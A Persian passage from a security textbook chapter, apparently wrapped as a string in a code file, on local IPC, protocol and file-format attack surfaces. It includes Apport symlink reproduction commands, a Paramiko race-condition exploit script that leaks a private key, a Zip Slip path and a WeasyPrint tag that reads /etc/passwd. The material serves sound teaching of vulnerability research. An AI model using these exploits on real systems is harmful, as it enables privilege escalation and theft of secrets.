- **رسیدگی به خطا (Error Handling):** بازیابی یا قطع ارتباط هنگام دریافت داده‌های نامعتبر.
- **رمزنگاری (Encryption):** تضمین محرمانگی و اصالت ارتباط.
- **خاتمه نشست (Session Termination):** پاک‌سازی امن منابع پس از اتمام تبادل.

به فهرست ۲-۹ توجه کنید که منطق پردازش PDUها را در \`sonic-snmpagent\` نشان می‌دهد:

\`\`\`python
# sonic-snmpagent/src/ax_interface/pdu_implementations.py
import asyncio
from . import logger, constants, exceptions
from .encodings import ObjectIdentifier
from .pdu import PDUHeader, PDUStream
from .pdu_implementations import RegisterPDU, ResponsePDU, OpenPDU

class AgentX(asyncio.Protocol):
    # --snip--
    def data_received(self, data):
        self.counter += 1
        if not (self.counter % constants.REPORTING_FREQUENCY):
            logger.debug("Parsed {} PDUs...".format(self.counter))
        try:
            # هر نوع PDU کلاس مجزایی دارد که هنگام ساخت استنتاج می‌شود
            for pdu in pdu_stream:
                if isinstance(pdu, ResponsePDU): ❶
                    # پردازش پاسخ
                    self.parse_response(pdu)
                else:
                    # ارسال پاسخ در صورت نیاز
                    response_pdu = pdu.make_response(self.mib_table)
                    self.transport.write(response_pdu.encode())
        except exceptions.PDUUnpackError: ❷
            logger.exception('decode_error[{}]'.format(data))
        except exceptions.PDUPackError:
            logger.exception('encode_error[{}]'.format(data))
        except Exception:
            logger.exception("Uncaught AgentX proto error! [{}]".format(data))
\`\`\`
*فهرست ۲-۹: منطق پردازش رویه‌ها در sonic-snmpagent*

این کد PDUهای پاسخ را در نقطه ❶ شناسایی و مدیریت می‌کند و خطاهای دیکود را با لاگ کردن نادیده می‌گیرد ❷؛ اما در سایر انواع PDU، کد بررسی نمی‌کند که آیا فیلد \`h.sessionID\` متعلق به یک نشست فعال و تأسیس‌شده است یا خیر! نادیده گرفتن ماشین حالت پروتکل می‌تواند به حملات سردرگمی حالت (State Confusion) و دور زدن مراحل احراز هویت بینجامد.

---

## سطح حمله محلی سیستم (Local Attack Surface)

ارتباطات بین‌فرایندی (IPC) میان فرایندها یا نخ‌ها روی یک سیستم‌عامل واحد برقرار می‌شود. در سطح حمله محلی، هدف مهاجم معمولاً **افزایش سطح دسترسی (Local Privilege Escalation - LPE)** است؛ زیرا مرز امنیتی در محیط محلی، تفکیک اختیارات میان حساب‌های کاربری عادی و سطوح ممتاز نظیر \`root\` در لینوکس یا \`SYSTEM\` در ویندوز است.

### فایل‌ها در ارتباطات بین‌فرایندی (Files in IPC)
فایل‌ها به عنوان کانال‌های ورودی/خروجی مشترک عمل می‌کنند. از آنجا که عملیات دیسک کندتر از حافظه رم است، فایل‌ها بیشتر برای مواردی مانند **فایل‌های قفل (Lock Files)** به کار می‌روند که نشان‌دهنده اجرای یک نسخه از برنامه هستند تا از تداخل چند نمونه جلوگیری شود.

نمونه بارز آن ویرایشگر Vim است. اگر در دو ترمینال همزمان دستور \`vi test\` را اجرا کنید، خطای E325 نمایان می‌شود:

\`\`\`text
E325: ATTENTION
Found a swap file by the name ".test.swp"
owned by: raccoon dated: Mon Mar 13 ...
file name: /test
modified: no
user name: raccoon host name: raccoon.local
process ID: 5968 (STILL RUNNING)
While opening file "test"
CANNOT BE FOUND
(1) Another program may be editing the same file...
(2) An edit session for this file crashed...
\`\`\`

#### اکسپلویت مسیرهای هاردکدشده در Apport (آسیب‌پذیری CVE-2020-8831)
هنگامی که برنامه‌های دارای دسترسی ریشه از مسیرهای ثابت در مکان‌های عمومی استفاده کنند، مهاجمان می‌توانند با حملات پیوند نمادین (Symlink) مقصد فایل‌ها را بازنویسی نمایند. این مسئله نمودی از مسأله **معاون سردرگم (Confused Deputy Problem)** است.

به تابع \`check_lock\` در ابزار مدیریت کرش اوبونتو (**Apport**) در فهرست ۲-۱۰ نگاه کنید:

\`\`\`python
# data/apport - Canonical Apport Crash Handler
def check_lock():
    '''در صورت اجرای نمونه دیگری از apport خارج شو.'''
    # ایجاد دایرکتوری فایل قفل
    try:
        os.mkdir("/var/lock/apport", mode=0o744) ❶
    except FileExistsError:
        pass
    # ایجاد فایل قفل
    try:
        fd = os.open("/var/lock/apport/lock", os.O_WRONLY | os.O_CREAT | os.O_NOFOLLOW) ❷
    except OSError as e:
        sys.exit(1)
    
    def error_running(*args):
        error_log('another apport instance is already running, aborting')
        sys.exit(1)
        
    original_handler = signal.signal(signal.SIGALRM, error_running)
    signal.alarm(30)
    try:
        fcntl.lockf(fd, fcntl.LOCK_EX) ❸
    except IOError:
        error_running()
    finally:
        signal.alarm(0)
        signal.signal(signal.SIGALRM, original_handler)
\`\`\`
*فهرست ۲-۱۰: تابع check_lock در برنامه Apport*

اگرچه توسعه‌دهندگان از فلگ \`os.O_NOFOLLOW\` در نقطه ❷ استفاده کرده‌اند تا مانع از باز شدن سیم‌لینک در بخش انتهایی مسیر (\`lock\`) شوند، اما طبق صفحه راهنمای سیستم‌عامل لینوکس:
> *"پیوندهای نمادین در بخش‌های پیشین مسیر همچنان دنبال خواهند شد!"*

در اوبونتو، مسیر \`/var/lock\` پیوندی نمادین به \`/run/lock\` است که برای همه کاربران قابل نوشتن است. یک کاربر عادی می‌تواند پیش از اجرای Apport، پیوندی در \`/var/lock/apport\` ایجاد کند که به یک پوشه سیستمی (نظیر \`/etc\`) اشاره کند. هنگامی که Apport با دسترسی root اجرا شود، فایلی به نام \`/etc/lock\` با مجوزهای پیش‌فرض عمومی \`0o777\` ایجاد می‌کند!

برای بازتولید در اوبونتو ۱۶.۰۴ با نسخه آسیب‌پذیر \`apport_2.20.1-0ubuntu2.22_all.deb\`:
1. ایجاد سیم‌لینک: \`ln -s /etc /var/lock/apport\`
2. ایجاد کرش عمدی برای فراخوانی Apport: \`sleep 10s & kill -11 $!\`
3. بررسی نتیجه: \`ls -l /etc/lock\` که نشان می‌دهد فایلی با مالکیت ریشه و دسترسی بازنویسی همگانی ایجاد شده است:

\`\`\`bash
-rwxrwxrwx 1 root root 0 Mar 19 01:41 /etc/lock
\`\`\`

---

#### شرایط رقابتی در ماژول Paramiko (آسیب‌پذیری CVE-2022-24302)
از آنجا که عملیات روی فایل‌ها اتمیک (تک‌گامی) نیستند، مستعد بروز شرایط رقابتی **زمان بررسی تا زمان استفاده (TOCTOU)** هستند. در کتابخانه محبوب پایتونی **Paramiko** برای اتصال SSH، متد ذخیره کلید خصوصی دچار این شکاف امنیتی بود:

\`\`\`python
# gen_save_key.py
import paramiko

# تولید کلید خصوصی RSA
pkey = paramiko.rsakey.RSAKey.generate(1024)
# ذخیره کلید در فایل
pkey.write_private_key_file('/tmp/testkey.pem')
\`\`\`
*فهرست ۲-۱۱: تولید و ذخیره کلید خصوصی در Paramiko*

کد آسیب‌پذیر درون متد \`_write_private_key_file\` کتابخانه Paramiko قرار داشت (فهرست ۲-۱۲):

\`\`\`python
# paramiko/pkey.py
def _write_private_key_file(self, filename, key, format, password=None):
    ❶ with open(filename, "w") as f:
        # شکاف شرایط رقابتی در این نقطه رخ می‌دهد!
        ❷ os.chmod(filename, 0o600)
        self._write_private_key(f, key, format, password=password)
\`\`\`
*فهرست ۲-۱۲: متد آسیب‌پذیر _write_private_key_file در Paramiko*

فایل ابتدا با متد \`open\` و با مجوزهای خواندن همگانی ایجاد می‌شود ❶ و سپس مجوزهای آن با \`os.chmod\` به \`0o600\` محدود می‌گردد ❷. نکته کلیدی سیستم‌عامل در اینجاست: **بررسی مجوزهای فایل تنها در زمان باز کردن فایل صورت می‌گیرد.** اگر فرایندی توصیف‌گر فایل (File Descriptor) را در فاصله زمانی میان \`open\` و \`chmod\` باز کند، حتی پس از تغییر دسترسی به \`600\`، همچنان می‌تواند داده‌های کلید خصوصی نوشته‌شده توسط ریشه را بخواند!

اسکریپت اکسپلویت این شرایط رقابتی در فهرست ۲-۱۳ آمده است:

\`\`\`python
# exploit.py
while True:
    try:
        f = open('/tmp/testkey.pem', 'r')
        input('توصیف‌گر فایل با موفقیت باز شد! کلید اینتر را برای خواندن فشار دهید...')
        print(f.read())
        break
    except:
        continue
\`\`\`
*فهرست ۲-۱۳: اسکریپت اکسپلویت شرایط رقابتی در Paramiko*

مراحل تست:
\`\`\`bash
# نصب نسخه آسیب‌پذیر:
$ sudo pip install paramiko==2.10.0

# اجرای اسکریپت اکسپلویت توسط کاربر عادی:
$ python exploit.py

# اجرای مجدد تولید کلید توسط کاربر ریشه:
$ sudo rm -f /tmp/testkey.pem
$ sudo python gen_save_key.py
\`\`\`

در ترمینال کاربر عادی پیام موفقیت ظاهر شده و محتوای کلید خصوصی افشا می‌شود:

\`\`\`text
توصیف‌گر فایل با موفقیت باز شد! کلید اینتر را برای خواندن فشار دهید...
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0rK...
-----END RSA PRIVATE KEY-----
\`\`\`

---

### سوکت‌های محلی یونیکس (Unix Domain Sockets)
سوکت‌های دامنه یونیکس (UDS) بدون افت سرعت پشته شبکه ارتباطات سریع بین‌فرایندی را فراهم می‌سازند و در سیستم فایل لینوکس به عنوان فایل نمایش داده می‌شوند. در آسیب‌پذیری **CVE-2022-21950** سرور Canna ژاپنی، حذف و ساخت دایرکتوری \`/tmp/.iroha_unix\` در سرویس systemd شکافی زمانی ایجاد می‌کرد که کاربر عادی می‌توانست پوشه را تصاحب کرده و با استقرار سوکت جعلی خود، اطلاعات ورودی کاربران را سرقت کند (حمله مرد میانی محلی).

لینوکس برای مقابله با جعل هویت در سوکت‌های UDS مکانیزم ارسال اطلاعات اعتبار سنجی فرایند از طریق کرنل را تحت ساختار \`struct ucred\` فراهم کرده است:

\`\`\`c
struct ucred {
    pid_t pid; /* شناسه فرایند ارسال‌کننده */
    uid_t uid; /* شناسه کاربر ارسال‌کننده */
    gid_t gid; /* شناسه گروه ارسال‌کننده */
};
\`\`\`
این مکانیزم به سرویس‌های ممتاز امکان می‌دهد هویت واقعی فرستنده را به شکلی غیرقابل جعل از کرنل استعلام نمایند.

---

### پایپ‌های نام‌گذاری‌شده در ویندوز (Windows Named Pipes)
در سیستم‌عامل ویندوز، پایپ‌های نام‌گذاری‌شده دارای فضای نام اختصاصی در \`\\.\pipe\*\` هستند و با سیستم فایل عادی تفاوت دارند. تابع \`CreateNamedPipe\` به سرور اجازه می‌دهد چند نمونه (Instance) همزمان برای کلاینت‌ها بسازد:

\`\`\`c
HANDLE CreateNamedPipeA(
    [in] LPCSTR lpName,
    [in] DWORD dwOpenMode,
    [in] DWORD dwPipeMode,
    [in] DWORD nMaxInstances,
    [in] DWORD nOutBufferSize,
    [in] DWORD nInBufferSize,
    [in] DWORD nDefaultTimeOut,
    [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes
);
\`\`\`

اگر پارامتر \`nMaxInstances\` مقداری بیش از ۱ داشته باشد و از پرچم \`FILE_FLAG_FIRST_PIPE_INSTANCE\` استفاده نشود، یک فرایند با دسترسی کم می‌تواند پیش از برنامه اصلی پایپ را ایجاد کند و پیام‌های ارتباطی را برباید.

همچنین مجوزهای دسترسی باید از طریق ساختار \`lpSecurityAttributes\` و لیست‌های کنترل دسترسی (ACL) به دقت تنظیم شوند. مقدار پیش‌فرض به گروه Everyone و Anonymous دسترسی می‌دهد که منجر به آسیب‌پذیری‌هایی نظیر **CVE-2022-24286** در برنامه Acer QuickAccess شده است. در فهرست ۲-۱۴ کدهای ایجاد ناامن یک پایپ نام‌گذاری‌شده در سی‌شارپ آمده است:

\`\`\`csharp
// worldrwpipe.cs
using System;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;

public class Program
{
    static void Main(string[] args)
    {
        // ایجاد ACL با دسترسی خواندن و نوشتن عمومی
        SecurityIdentifier sid = new SecurityIdentifier(
            WellKnownSidType.WorldSid,
            null
        );
        PipeAccessRule pipeAccessRule = new PipeAccessRule(
            sid,
            PipeAccessRights.ReadWrite,
            AccessControlType.Allow
        );
        PipeSecurity pipeSecurity = new PipeSecurity();
        pipeSecurity.AddAccessRule(pipeAccessRule);

        // ساخت سرور پایپ با ACL همگانی
        NamedPipeServerStream pipeServer = NamedPipeServerStreamAcl.Create(
            "worldRWPipe",
            PipeDirection.InOut,
            NamedPipeServerStream.MaxAllowedServerInstances,
            PipeTransmissionMode.Byte,
            PipeOptions.Asynchronous,
            0,
            0,
            pipeSecurity
        );

        pipeServer.WaitForConnection();
        // اجرای عملیات با ورودی غیرقابل اعتماد در اینجا...
    }
}
\`\`\`
*فهرست ۲-۱۴: ایجاد یک پایپ نام‌گذاری‌شده با دسترسی همگانی در سی‌شارپ*

علاوه بر این، در ویندوز توابعی نظیر \`ImpersonateNamedPipeClient\` وجود دارند که به سرور اجازه می‌دهند در کانتکست امنیتی کلاینت متصل‌شده به پایپ عمل کند. اگر کلاینتی با سطح دسترسی بالا (مانند \`SYSTEM\`) به پایپ سروری متصل شود که توسط یک مهاجم محلی کنترل می‌شود، مهاجم می‌تواند با ربودن هویت کلاینت به بالاترین سطح دسترسی ویندوز دست یابد!

---

### سایر روش‌های ارتباط بین‌فرایندی (Other IPC Methods)
توسعه‌دهندگان از روش‌های متنوع دیگری نیز استفاده می‌کنند:
- **حافظه اشتراکی (Shared Memory)**
- **سیگنال‌های سیستمی (System Signals)**
- **صف‌های پیام (Message Queues)**
- **فایل‌های نگاشت‌شده در حافظه (Memory-Mapped Files)**
- **فراخوانی رویه از راه دور (RPC)**
- **مدل شیء مؤلفه‌ای (COM - مختص ویندوز)**
- **تبادل داده پویا (DDE - مختص ویندوز)**
- **کلیپ‌بورد سیستم‌عامل (Clipboard)**
- **گذرگاه D-Bus (مختص لینوکس)**

پیاده‌سازی‌های غیرمتعارف خطرات فراوانی دارند. به عنوان مثال، نگارنده برنامه‌ای را تحلیل کرد که برای ارسال داده‌های پیچیده بین پنجره‌ها از تابع \`SendMessage\` و برای یافتن پنجره از \`FindWindow(NULL, lpWindowName)\` استفاده می‌کرد. از آنجا که آرگومان کلاس پنجره \`NULL\` داده شده بود، مهاجم می‌توانست با ایجاد پنجره‌ای با همان عنوان پیام‌ها را برباید و دستکاری نماید.

---

## قالب‌های فایل (File Formats)

تقریباً تمام نرم‌افزارها نیازمند پردازش فایل‌ها هستند. پارس کردن فرمت‌های پیچیده بستر سرشاری از آسیب‌پذیری‌های امنیتی به شمار می‌رود. ساختار عمومی بیشتر فایل‌ها به سه بخش تقسیم می‌شود:
- **هدر (Header):** در ابتدای فایل قرار دارد و شامل بایت‌های جادویی (Magic Bytes) و متادیتاهایی نظیر نسخه فایل است.
- **بدنه (Body):** داده‌های اصلی فایل که معمولاً در قالب تکه‌ها (Chunks) دسته‌بندی می‌شوند.
- **فوتر (Footer):** شامل متادیتای پایانی مانند کدهای کنترلی (Checksums) برای اعتبارسنجی یکپارچگی فایل.

برخی فرمت‌ها بر پایه نشانه‌گذاری متنی هستند (مانند اسناد XML) و برخی دیگر فرمت‌های دایرکتوری‌محور هستند (نظیر فایل‌های \`.docx\`، \`.pptx\`، \`.apk\` و \`.jar\` که در حقیقت فایل‌های فشرده ZIP حاوی اسناد XML و تصاویر هستند).

---

### فرمت‌های نوع-طول-مقدار (Type-Length-Value - TLV)
الگوی TLV برای سازمان‌دهی داده‌های با طول متغیر به کار می‌رود:
- **نوع (Type):** ماهیت فیلد داده را معین می‌کند.
- **طول (Length):** اندازه فیلد داده را به بایت بیان می‌کند.
- **مقدار (Value):** محتوای خام داده.

تصاویر **PNG** از این الگو استفاده می‌کنند. جدول ۲-۱ نحوه پارس شدن چانک هدر \`IHDR\` در تصویر PNG را نشان می‌دهد:

| مؤلفه (Part) | بایت‌های هگزادسیمال (Hex bytes) | مقدار تفسیری (Value) |
| :--- | :--- | :--- |
| **Length** | \`00 00 00 0d\` | 13 بایت |
| **Type** | \`49 48 44 52\` | شناسه IHDR |
| **Data (عرض)** | \`00 00 00 01\` | عرض تصویر: 1 پیکسل |
| **Data (ارتفاع)** | \`00 00 00 01\` | ارتفاع تصویر: 1 پیکسل |
| **Data (عمق بیتی)** | \`08\` | عمق بیت: 8 |
| **Data (نوع رنگ)** | \`00\` | مقیاس خاکستری (Color type: 0) |
| **Data (روش فشرده‌سازی)** | \`00\` | فشرده‌سازی Deflate |
| **Data (روش فیلتر)** | \`00\` | فیلتر استاندارد |
| **Data (نوع اینترلیس)** | \`00\` | بدون اینترلیس |
| **CRC** | \`3a 7e 9b 55\` | کد افزونگی چرخه‌ای CRC-32 |

*جدول ۲-۱: یک نمونه چانک IHDR در فرمت تصویری PNG*

آسیب‌پذیری زمانی رخ می‌دهد که توسعه‌دهنده بدون راستی‌آزمایی مقدار طول (\`Length\`) با اندازه مورد انتظار نوع داده، داده‌ها را کپی کند. در فرمت پایگاه داده **dBase (DBF)** در نرم‌افزار **Apache OpenOffice** (آسیب‌پذیری **CVE-2021-33035**)، هدر شامل فیلدهایی برای نوع و اندازه بود. برای فیلد نوع صحیح (\`I\`) کدهای اوپن‌آفیس بافری ۴ بایتی تخصیص می‌داد، اما تعداد بایت‌های کپی‌شده را از فیلد اندازه ۱ بایتی تحت کنترل مهاجم (با حداکثر مقدار ۲۵۵) می‌خواند:

\`\`\`c
// آسیب‌پذیری سرریز بافر در OpenOffice (CVE-2021-33035)
else if ( DataType::INTEGER == nType )
{
    // نوع داده sal_Int32 دقیقاً ۴ بایت است
    sal_Int32 nValue = 0;
    // مقدار nLen از فیلد سایز دیسکریپتور تحت کنترل فایل خوانده می‌شود (تا ۲۵۵ بایت)
    memcpy(&nValue, pData, nLen);
    *(_rRow->get())[i] = nValue;
}
\`\`\`

کپی شدن تا ۲۵۵ بایت درون بافر ۴ بایتی، موجب ۲۵۱ بایت سرریز روی پشته و بازنویسی آدرس بازگشت (Return Address) تابع شد که نگارنده توانست با بهره‌برداری کامل از آن، اکسپلویت اجرای کد دلخواه (RCE) را پیاده‌سازی کند.

---

### فرمت‌های دایرکتوری‌محور و آرشیوها (Directory-Based Formats)
قالب‌هایی چون ZIP، TAR، DOCX و APK ساختاری درختی دارند. این فرمت‌ها با دو خطر امنیتی عمده روبرو هستند:

1. **پیمایش مسیر (Zip Slip / Path Traversal):** هدر فایل‌های فشرده فیلدی برای نام و مسیر فایل دارد. اگر پارسر نام‌هایی مانند \`../../../../tmp/evil.sh\` را پالایش نکند، فایل هنگام استخراج در پوشه‌های حساس سیستمی (مانند \`cron.d\`) رونویسی خواهد شد.
2. **تزریق موجودیت خارجی در مانیفست‌ها (XXE Injection):** بسیاری از این فایل‌ها از اسناد XML برای تشریح ساختار فایل‌ها استفاده می‌کنند. در دی‌کامپایلر محبوب **JADX** برای اپلیکیشن‌های اندروید (آسیب‌پذیری **CVE-2022-0219**)، مهاجم توانست با تزریق پی‌لود XXE در فایل \`AndroidManifest.xml\`، برنامه JADX را وادار سازد محتوای فایل‌های سیستم محلی تحلیل‌گر را استخراج کرده و به سرور راه دور بفرستد.

نگارنده در پژوهشی دیگر با ترکیب زنجیره‌ای از پیمایش مسیر ZIP و آسیب‌پذیری XXE موفق به استقرار وب‌شل و اجرای کامل کد از راه دور در یک فرمت اختصاصی بسته نرم‌افزاری شد.

---

### فیلدهای سفارشی و رفتارهای غیرمستند (Custom Fields)
بسیاری از فرمت‌ها فیلدهایی با پیشوند \`X-\` برای رفتارهای غیررسمی ارائه می‌دهند. برای مثال، فرمت تقویم **iCalendar (.ics)** در نسخه‌های پیشین مایکروسافت آفیس از ویژگی \`X-MS-OLK-COLLABORATEDOC\` پشتیبانی می‌کرد که سندی را به طور خودکار با شروع رویداد باز می‌کرد. با ارسال یک دعوت‌نامه به قربانی، می‌شد برنامه‌ای مخرب را از طریق اشتراک شبکه اجرا کرد.

همچنین برخی موتورها ویژگی‌های استانداردی را دستکاری می‌کنند. برای نمونه در موتور تبدیل HTML به PDF موسوم به **WeasyPrint**، صفت \`rel="attachment"\` در تگ \`<link>\` تعریف شده است:

\`\`\`html
<link href="file:///etc/passwd" rel="attachment">
\`\`\`

این تگ فایل \`/etc/passwd\` را به عنوان فایل پیوست درون سند PDF قرار می‌دهد که در صورت غفلت توسعه‌دهنده به افشای فایل‌های حساس سرور منجر می‌شود.

---

## جمع‌بندی فصل (Summary)

در این فصل بردارهای حمله گوناگونی را از پروتکل‌های شبکه تا ارتباطات بین‌فرایندی و قالب‌های فایل بررسی کردیم. شما آموختید که چگونه کدهای منبعی را که این بردارها را به وجود می‌آورند شناسایی کنید و چه الگوهایی نقاط ضعف امنیتی را آشکار می‌سازند.

سطح حمله هر نرم‌افزار متأثر از مدل تهدید و محیط است. تعیین اینکه آیا یک بردار حمله قابلیت اکسپلویت واقعی دارد یا خیر، در گرو شناخت **مرزهای امنیتی (Security Boundaries)** است. این تمایز شما را قادر می‌سازد در میان انبوه سطرهای کد، سریعاً روی سناریوهای عملیاتی متمرکز شوید.

در فصل بعدی خواهید دید که چگونه این تکنیک‌ها را با موتورهای مدرن تحلیل تنوع و کوئری‌نویسی در کد مانند **CodeQL** و **Semgrep** خودکارسازی کنید تا آسیب‌پذیری‌ها را در مقیاس میلیون‌ها سطر کد منبع شکار نمایید.
`,
};
